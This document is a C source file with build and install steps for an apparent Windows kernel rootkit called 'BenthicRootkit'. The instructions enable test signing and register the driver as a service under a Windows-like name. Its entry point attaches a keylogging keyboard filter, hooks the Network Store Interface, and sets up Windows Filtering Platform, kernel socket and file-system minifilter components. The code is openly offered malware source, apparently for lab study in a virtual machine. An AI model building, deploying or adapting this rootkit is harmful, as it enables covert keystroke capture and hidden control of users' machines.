// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// Name:                            BenthicRootkit
// IDE:                             Open Visual Studio
// Template:                        Create a new project -> Search for templates (Alt + S) -> Kernel Mode Driver, Empty (KMDF) -> Next
// Project:                         Project Name: BenthicZone02_KernelModeDriver -> Solution Name: BenthicRootkit -> Create
// Source File:                     Source Files -> Add -> New Item... -> Main_Driver.c
// Source Code:                     Open Main_Driver.c and copy the corresponding source code
// Library Dependencies:            Open Project Properties -> Linker -> Input -> Additional Dependencies -> Add '$(DDK_LIB_PATH)fltMgr.lib;'
// Library Dependencies:            Open Project Properties -> Linker -> Input -> Additional Dependencies -> Add '$(DDK_LIB_PATH)fwpkclnt.lib;'
// Enable NDIS Support:             Go to Project Properties -> Configuration Properties -> C/C++ -> Preprocessor -> Add 'NDIS_SUPPORT_NDIS6;' to Preprocessor Definitions.
// Library Dependencies:            Open Project Properties -> Linker -> Input -> Additional Dependencies -> Add '$(DDK_LIB_PATH)Netio.lib;'
// LibWSK:                          You should ideally create your own wrapper library for WSK tailored to your project. But if you want something quick and ready-to-go, you can use [Musa.libwsk] from NuGet: Right-click on the project -> Manage NuGet Packages -> Search: "Musa.libwsk" -> Install
// Include Directories:             Open Project Properties -> C/C++ -> General -> Additional Include Directories -> '$(NuGetPackageRoot)Musa.libwsk\build\native\include;'
// Build Project:                   Set Configuration to Release, x64 -> Build -> Build Solution
// Add Project:                     In Solution Explorer -> Right-click the solution (BenthicRootkit) -> Add -> New Project...
// Template:                        Search for templates (Alt + S) -> Console App -> Next
// Project:                         Project name: BenthicZone01_ConsoleApplication -> Create
// Source File:                     In Solution Explorer -> Find BenthicZone01_ConsoleApplication.cpp -> Rename to Main_Application.c
// Source Code:                     Open Main_Application.c and copy the corresponding source code
// Build Project:                   Set Configuration to Release, x64 -> Build -> Build Solution
// Locate Driver:                   C:\Users\%USERNAME%\source\repos\BenthicRootkit\x64\Release\BenthicZone02_KernelModeDriver.sys
// Locate App:                      C:\Users\%USERNAME%\source\repos\BenthicRootkit\x64\Release\BenthicZone01_ConsoleApplication.exe
// Virtual Machine:                 Open VMware Workstation -> Power on (MalwareWindows11) virtual machine
// Move Driver:                     Copy BenthicZone02_KernelModeDriver.sys (Host) to C:\Users\%USERNAME%\Downloads\BenthicZone02_KernelModeDriver.sys (VM)
// Move App:                        Move BenthicZone01_ConsoleApplication.exe (Host) to C:\Users\%USERNAME%\Downloads\BenthicZone01_ConsoleApplication.exe (VM)
// Enable Test Mode:                Open a CMD window as Administrator -> bcdedit /set testsigning on -> Restart
// Driver Installation:             Open a CMD window as Administrator -> sc.exe create WindowsKernelBenthicRootkit type=kernel start=demand binpath="C:\Users\%USERNAME%\Downloads\BenthicZone02_KernelModeDriver.sys"
// Registered Driver:               Open AutoRuns as Administrator -> Navigate to the Drivers tab -> Look for WindowsKernelBenthicRootkit
// Service Status:                  Run in CMD as Administrator -> sc.exe query WindowsKernelBenthicRootkit -> driverquery.exe
// Registry Entry:                  Open regedit -> Navigate to HKLM\SYSTEM\CurrentControlSet\Services -> Look for WindowsKernelBenthicRootkit
// Monitor Messages:                Open DebugView as Administrator -> Enable options ("Capture -> Capture Kernel" and "Capture -> Enable Verbose Kernel Output") -> Close and reopen DebugView as Administrator
// Start Routine:                   Run in CMD as Administrator -> sc.exe start WindowsKernelBenthicRootkit
// User Mode App:                   Open CMD -> Navigate to the directory -> Run BenthicZone01_ConsoleApplication.exe
// Clean:                           Run in CMD as Administrator -> sc.exe stop WindowsKernelBenthicRootkit
// Remove:                          Run in CMD as Administrator -> sc.exe delete WindowsKernelBenthicRootkit



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/
// This header is used by kernel
#include <ntddk.h>

// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/
// This header contains reference material that includes specific details about the routines, structures, and data types that you will need to use to write kernel-mode drivers.
#include <wdm.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include "Functions/Functions00Device.h"
#include "Functions/Functions02IRPs.h"
#include "Functions/Techniques/KeyboardFilter.h"
#include "Functions/Techniques/NetworkStoreInterface.h"
#include "Functions/Techniques/WindowsFilteringPlatform.h"
#include "Functions/Techniques/WinSockKernel.h"
#include "Functions/Techniques/MiniFilter.h"



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief      Unloads a Windows kernel-mode driver.
	@details    This function is called when the driver is being unloaded from memory. It is responsible for cleaning up resources and performing necessary cleanup tasks before the driver is removed from the system. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_unload


	@see        PDRIVER_OBJECT          https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
	@param      pDriverObject           Pointer to a DRIVER_OBJECT structure representing the driver.
**/
VOID
DriverUnload(
	_In_        PDRIVER_OBJECT          pDriverObject
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Main.c] (DriverUnload) - Hello");


	// ---------------------------------------------------------------------------------------------------------------------
	// Cleanup resources allocated by enabled techniques
	TechniquesKeyboardFilter_Unload();
	TechniquesWindowsFilteringPlatform_Unload();
	TechniquesNetworkStoreInterface_Unload();
	TechniquesWinSockKernel_Unload();


	// ---------------------------------------------------------------------------------------------------------------------
	// Delete symbolic link and device
	IoDeleteSymbolicLink(&Global_FunctionsDevice_Device_Symbolic_Link);
	IoDeleteDevice(pDriverObject->DeviceObject);


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	DbgPrint("Benthic Zone -> KernelModeDriver [Main.c] (DriverUnload) - Bye");
}



/**
	@brief      Entry point for a Windows kernel-mode driver.
	@details    This function is called when the driver is loaded into memory. It initializes the driver and performs necessary setup tasks. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/wdf/driverentry-for-kmdf-drivers


	@see        PDRIVER_OBJECT          https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
	@param      pDriverObject           Pointer to a DRIVER_OBJECT structure representing the driver's image in the operating system kernel.

	@see        PUNICODE_STRING         https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string
	@param      pRegistryPath           Pointer to a UNICODE_STRING structure, containing the driver's registry path as a Unicode string, indicating the driver's location in the Windows registry.


	@return     A NTSTATUS value indicating success or an error code if initialization fails.
**/
NTSTATUS
CustomDriverEntry(
	_In_        PDRIVER_OBJECT          pDriverObject,
	_In_        PUNICODE_STRING         pRegistryPath
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Preventing compiler warnings for unused parameter. We're not using the registry path, so we need to mark it as unreferenced.
	UNREFERENCED_PARAMETER(pRegistryPath);

	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Main.c] (DriverEntry) - Hello");
	DbgPrint("Benthic Zone -> KernelModeDriver [Main.c] (DriverEntry) - Loading...");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	NTSTATUS status;

	// ---------------------------------------------------------------------------------------------------------------------
	// Initialize registry keys for the MiniFilter
	status = TechniquesMiniFilter_InstanceRegistry(pRegistryPath);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Main.c] (DriverEntry) - ERROR: Failed to Mini00UtilsRegistry_InitializeInstanceRegistry (Status 0x%08X).", status);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Initialize device and symbolic link
	DbgPrint("Benthic Zone -> KernelModeDriver [Main.c] (DriverEntry) - Initialize device and symbolic link");
	status = FunctionsDevice_InitializeDevice(pDriverObject);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Main.c] (DriverEntry) - ERROR: Failed to initialize device (Status 0x%08X).", status);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Set DriverUnload routine
	DbgPrint("Benthic Zone -> KernelModeDriver [Main.c] (DriverEntry) - Set DriverUnload routine");
	pDriverObject->DriverUnload = DriverUnload;


	// ---------------------------------------------------------------------------------------------------------------------
	// Setup IRP handling
	DbgPrint("Benthic Zone -> KernelModeDriver [Main.c] (DriverEntry) - Setup I/O Request Packets (IRO) handling");
	FunctionsIRPs_SetupMajorFunctions(pDriverObject);


	// ---------------------------------------------------------------------------------------------------------------------
	// Attach keyboard filter
	status = TechniquesKeyboardFilter_KeyloggerAttachKeyboard(pDriverObject);

	// Failed
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Main.c] (DriverEntry) - Failed to attach Keyboard (Status 0x%08X).", status);
		IoDeleteDevice(Global_FunctionsDevice_Device_Object);
		IoDeleteSymbolicLink(&Global_FunctionsDevice_Device_Symbolic_Link);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Attach to NSI
	
	status = TechniquesNetworkStoreInterface_AttachToNSI();

	// Failed
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Main.c] (DriverEntry) - Failed to attach NSI (Status 0x%08X).", status);
		IoDeleteDevice(Global_FunctionsDevice_Device_Object);
		IoDeleteSymbolicLink(&Global_FunctionsDevice_Device_Symbolic_Link);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Initialize WFP
	status = TechniquesWindowsFilteringPlatform_Init(Global_FunctionsDevice_Device_Object);

	// Failed
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Main.c] (DriverEntry) - Failed to initialize WFP (Status 0x%08X).", status);
		IoDeleteDevice(Global_FunctionsDevice_Device_Object);
		IoDeleteSymbolicLink(&Global_FunctionsDevice_Device_Symbolic_Link);
		return status;
	}
	

	// ---------------------------------------------------------------------------------------------------------------------
	// Initialize MiniFilter
	status = TechniquesMiniFilter_Init(pDriverObject, pRegistryPath);

	// Failed
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Main.c] (DriverEntry) - Failed to initialize MiniFilter (Status 0x%08X).", status);
		IoDeleteDevice(Global_FunctionsDevice_Device_Object);
		IoDeleteSymbolicLink(&Global_FunctionsDevice_Device_Symbolic_Link);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Success
	DbgPrint("Benthic Zone -> KernelModeDriver [Main.c] (DriverEntry) - Driver successfully initialized and running");


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	DbgPrint("Benthic Zone -> KernelModeDriver [Main.c] (DriverEntry) - Bye");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return STATUS_SUCCESS;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
